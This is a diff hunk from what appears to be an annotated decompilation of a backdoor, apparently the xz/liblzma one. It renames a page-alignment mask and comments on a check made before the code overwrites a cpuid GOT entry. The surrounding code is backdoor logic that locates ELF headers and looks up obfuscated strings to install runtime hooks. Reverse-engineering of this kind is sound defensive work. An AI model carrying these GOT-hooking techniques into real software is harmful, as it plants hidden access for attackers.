@@ -140,7 +140,7 @@ BOOL backdoor_install_runtime_hooks(backdoor_setup_params_t *params)
     }
     // AutoDoc: Sanity-check that the resolver frame and cpuid GOT slot live near each other; otherwise abort before touching an unrelated GOT entry.
     if (loop_idx < 0x50001) {
-      string_begin = (Elf64_Ehdr *)((ulong)resolver_frame_addr & 0xfffffffffffff000);
+      string_begin = (Elf64_Ehdr *)((ulong)resolver_frame_addr & PAGE_ALIGN_MASK_4K);
       symbol_module_ehdr = string_begin + -0x800;
 LAB_00105951:
       string_id = encoded_string_id_lookup((char *)string_begin,(char *)0x0);
